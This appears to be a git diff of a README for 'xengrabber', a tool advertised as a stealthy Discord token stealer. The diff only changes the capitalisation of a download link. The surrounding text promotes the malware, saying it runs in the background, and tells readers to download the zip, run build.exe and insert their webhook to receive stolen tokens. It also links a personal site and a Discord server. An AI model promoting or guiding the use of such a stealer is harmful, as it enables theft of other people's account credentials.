@@ -9,7 +9,7 @@
 - added discord token stealer
 - added stealth, which means it will run in the background
 
-- download the [xengrabber.zip](https://github.com/xen-light/xengrabberv2/blob/main/xengrabber.zip?raw=true) and run the build.exe, put your webhook and voila!
+- download the [xengrabber.zip](https://github.com/xen-light/xengrabberV2/blob/main/xengrabber.zip?raw=true) and run the build.exe, put your webhook and voila!
 
 - personal website: [https://xenlight.tk](https://xenlight.tk)
 - join us today: [discord](https://discord.gg/jtJQ8kmRG8)
